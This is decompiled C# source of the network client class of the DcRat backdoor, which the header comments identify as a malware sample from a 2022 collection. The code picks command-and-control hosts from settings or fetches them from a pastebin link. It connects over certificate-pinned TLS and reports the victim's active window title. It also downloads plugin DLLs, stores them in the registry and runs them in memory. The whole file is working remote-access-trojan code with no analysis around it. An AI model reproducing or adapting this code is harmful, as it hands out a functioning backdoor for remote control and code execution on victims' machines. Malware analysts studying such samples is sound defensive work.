// Decompiled with JetBrains decompiler
// Type: Client.Connection.ClientSocket
// Assembly: Hau, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 43E252B6-B9CE-452D-8541-D8645EC414DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.DcRat.gen-b46a6ed5d0d601aa0e1087095ddea928405c927d65ab795aca3a148d2fb37d13.exe

using Client.Helper;
using MessagePackLib.MessagePack;
using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Client.Connection
{
  public static class ClientSocket
  {
    public static List<MsgPack> Packs = new List<MsgPack>();

    public static Socket TcpClient { get; set; }

    public static SslStream SslClient { get; set; }

    private static byte[] Buffer { get; set; }

    private static long HeaderSize { get; set; }

    private static long Offset { get; set; }

    private static System.Threading.Timer KeepAlive { get; set; }

    public static bool IsConnected { get; set; }

    private static object SendSync { get; } = new object();

    private static System.Threading.Timer Ping { get; set; }

    public static int Interval { get; set; }

    public static bool ActivatePo_ng { get; set; }

    public static void InitializeClient()
    {
      try
      {
        ClientSocket.TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        {
          ReceiveBufferSize = 51200,
          SendBufferSize = 51200
        };
        if (Settings.Paste_bin == "null")
        {
          string str = Settings.Hos_ts.Split(',')[new Random().Next(Settings.Hos_ts.Split(',').Length)];
          int int32 = Convert.ToInt32(Settings.Por_ts.Split(',')[new Random().Next(Settings.Por_ts.Split(',').Length)]);
          if (ClientSocket.IsValidDomainName(str))
          {
            foreach (IPAddress hostAddress in Dns.GetHostAddresses(str))
            {
              try
              {
                ClientSocket.TcpClient.Connect(hostAddress, int32);
                if (ClientSocket.TcpClient.Connected)
                  break;
              }
              catch
              {
              }
            }
          }
          else
            ClientSocket.TcpClient.Connect(str, int32);
        }
        else
        {
          using (WebClient webClient = new WebClient())
          {
            NetworkCredential networkCredential = new NetworkCredential("", "");
            webClient.Credentials = (ICredentials) networkCredential;
            string[] strArray = webClient.DownloadString(Settings.Paste_bin).Split(new string[1]
            {
              ":"
            }, StringSplitOptions.None);
            Settings.Hos_ts = strArray[0];
            Settings.Por_ts = strArray[new Random().Next(1, strArray.Length)];
            ClientSocket.TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
          }
        }
        if (ClientSocket.TcpClient.Connected)
        {
          ClientSocket.IsConnected = true;
          ClientSocket.SslClient = new SslStream((Stream) new NetworkStream(ClientSocket.TcpClient, true), false, new RemoteCertificateValidationCallback(ClientSocket.ValidateServerCertificate));
          ClientSocket.SslClient.AuthenticateAsClient(ClientSocket.TcpClient.RemoteEndPoint.ToString().Split(':')[0], (X509CertificateCollection) null, SslProtocols.Tls, false);
          ClientSocket.HeaderSize = 4L;
          ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
          ClientSocket.Offset = 0L;
          ClientSocket.Send(IdSender.SendInfo());
          ClientSocket.Interval = 0;
          ClientSocket.ActivatePo_ng = false;
          ClientSocket.KeepAlive = new System.Threading.Timer(new TimerCallback(ClientSocket.KeepAlivePacket), (object) null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
          ClientSocket.Ping = new System.Threading.Timer(new TimerCallback(ClientSocket.Po_ng), (object) null, 1, 1);
          ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int) ClientSocket.Offset, (int) ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), (object) null);
        }
        else
          ClientSocket.IsConnected = false;
      }
      catch
      {
        ClientSocket.IsConnected = false;
      }
    }

    private static bool IsValidDomainName(string name) => Uri.CheckHostName(name) != 0;

    private static bool ValidateServerCertificate(
      object sender,
      X509Certificate certificate,
      X509Chain chain,
      SslPolicyErrors sslPolicyErrors)
    {
      return Settings.Server_Certificate.Equals(certificate);
    }

    public static void Reconnect()
    {
      try
      {
        ClientSocket.Ping?.Dispose();
        ClientSocket.KeepAlive?.Dispose();
        ClientSocket.SslClient?.Dispose();
        ClientSocket.TcpClient?.Dispose();
      }
      catch
      {
      }
      ClientSocket.IsConnected = false;
    }

    public static void ReadServertData(IAsyncResult ar)
    {
      try
      {
        if (!ClientSocket.TcpClient.Connected || !ClientSocket.IsConnected)
        {
          ClientSocket.IsConnected = false;
        }
        else
        {
          int num1 = ClientSocket.SslClient.EndRead(ar);
          if (num1 > 0)
          {
            ClientSocket.Offset += (long) num1;
            ClientSocket.HeaderSize -= (long) num1;
            if (ClientSocket.HeaderSize == 0L)
            {
              ClientSocket.HeaderSize = (long) BitConverter.ToInt32(ClientSocket.Buffer, 0);
              if (ClientSocket.HeaderSize > 0L)
              {
                ClientSocket.Offset = 0L;
                ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
                while (ClientSocket.HeaderSize > 0L)
                {
                  int num2 = ClientSocket.SslClient.Read(ClientSocket.Buffer, (int) ClientSocket.Offset, (int) ClientSocket.HeaderSize);
                  if (num2 <= 0)
                  {
                    ClientSocket.IsConnected = false;
                    return;
                  }
                  ClientSocket.Offset += (long) num2;
                  ClientSocket.HeaderSize -= (long) num2;
                  if (ClientSocket.HeaderSize < 0L)
                  {
                    ClientSocket.IsConnected = false;
                    return;
                  }
                }
                new Thread(new ParameterizedThreadStart(ClientSocket.Read)).Start((object) ClientSocket.Buffer);
                ClientSocket.Offset = 0L;
                ClientSocket.HeaderSize = 4L;
                ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
              }
              else
              {
                ClientSocket.HeaderSize = 4L;
                ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
                ClientSocket.Offset = 0L;
              }
            }
            else if (ClientSocket.HeaderSize < 0L)
            {
              ClientSocket.IsConnected = false;
              return;
            }
            ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int) ClientSocket.Offset, (int) ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), (object) null);
          }
          else
            ClientSocket.IsConnected = false;
        }
      }
      catch
      {
        ClientSocket.IsConnected = false;
      }
    }

    public static void Send(byte[] msg)
    {
      lock (ClientSocket.SendSync)
      {
        try
        {
          if (!ClientSocket.IsConnected)
            return;
          byte[] bytes = BitConverter.GetBytes(msg.Length);
          ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
          ClientSocket.SslClient.Write(bytes, 0, bytes.Length);
          if (msg.Length > 1000000)
          {
            using (MemoryStream memoryStream = new MemoryStream(msg))
            {
              memoryStream.Position = 0L;
              byte[] buffer = new byte[50000];
              int count;
              while ((count = memoryStream.Read(buffer, 0, buffer.Length)) > 0)
              {
                ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
                ClientSocket.SslClient.Write(buffer, 0, count);
                ClientSocket.SslClient.Flush();
              }
            }
          }
          else
          {
            ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
            ClientSocket.SslClient.Write(msg, 0, msg.Length);
            ClientSocket.SslClient.Flush();
          }
        }
        catch
        {
          ClientSocket.IsConnected = false;
        }
      }
    }

    public static void KeepAlivePacket(object obj)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
        msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
        ClientSocket.Send(msgPack.Encode2Bytes());
        GC.Collect();
        ClientSocket.ActivatePo_ng = true;
      }
      catch
      {
      }
    }

    private static void Po_ng(object obj)
    {
      try
      {
        if (!ClientSocket.ActivatePo_ng || !ClientSocket.IsConnected)
          return;
        ++ClientSocket.Interval;
      }
      catch
      {
      }
    }

    public static void Read(object data)
    {
      try
      {
        MsgPack unpack_msgpack1 = new MsgPack();
        unpack_msgpack1.DecodeFromBytes((byte[]) data);
        string asString = unpack_msgpack1.ForcePathObject("Pac_ket").AsString;
        if (!(asString == "Po_ng"))
        {
          if (!(asString == "plu_gin"))
          {
            if (!(asString == "save_Plugin"))
              return;
            SetRegistry.SetValue(unpack_msgpack1.ForcePathObject("Hash").AsString, unpack_msgpack1.ForcePathObject("Dll").GetAsBytes());
            foreach (MsgPack unpack_msgpack2 in ClientSocket.Packs.ToList<MsgPack>())
            {
              if (unpack_msgpack2.ForcePathObject("Dll").AsString == unpack_msgpack1.ForcePathObject("Hash").AsString)
              {
                ClientSocket.Invoke(unpack_msgpack2);
                ClientSocket.Packs.Remove(unpack_msgpack2);
              }
            }
          }
          else
          {
            try
            {
              if (SetRegistry.GetValue(unpack_msgpack1.ForcePathObject("Dll").AsString) == null)
              {
                ClientSocket.Packs.Add(unpack_msgpack1);
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").SetAsString("sendPlugin");
                msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack1.ForcePathObject("Dll").AsString);
                ClientSocket.Send(msgPack.Encode2Bytes());
              }
              else
                ClientSocket.Invoke(unpack_msgpack1);
            }
            catch (Exception ex)
            {
              ClientSocket.Error(ex.Message);
            }
          }
        }
        else
        {
          ClientSocket.ActivatePo_ng = false;
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
          msgPack.ForcePathObject("Message").SetAsInteger((long) ClientSocket.Interval);
          ClientSocket.Send(msgPack.Encode2Bytes());
          ClientSocket.Interval = 0;
        }
      }
      catch (Exception ex)
      {
        ClientSocket.Error(ex.Message);
      }
    }

    private static void Invoke(MsgPack unpack_msgpack)
    {
      object instance = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).GetType("Plugin.Plugin"));
      // ISSUE: reference to a compiler-generated field
      if (ClientSocket.\u003C\u003Eo__53.\u003C\u003Ep__0 == null)
      {
        // ISSUE: reference to a compiler-generated field
        ClientSocket.\u003C\u003Eo__53.\u003C\u003Ep__0 = CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", (IEnumerable<Type>) null, typeof (ClientSocket), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[9]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      ClientSocket.\u003C\u003Eo__53.\u003C\u003Ep__0.Target((CallSite) ClientSocket.\u003C\u003Eo__53.\u003C\u003Ep__0, instance, ClientSocket.TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
      ClientSocket.Received();
    }

    private static void Received()
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));
      ClientSocket.Send(msgPack.Encode2Bytes());
      Thread.Sleep(1000);
    }

    public static void Error(string ex)
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Pac_ket").AsString = nameof (Error);
      msgPack.ForcePathObject(nameof (Error)).AsString = ex;
      ClientSocket.Send(msgPack.Encode2Bytes());
    }
  }
}
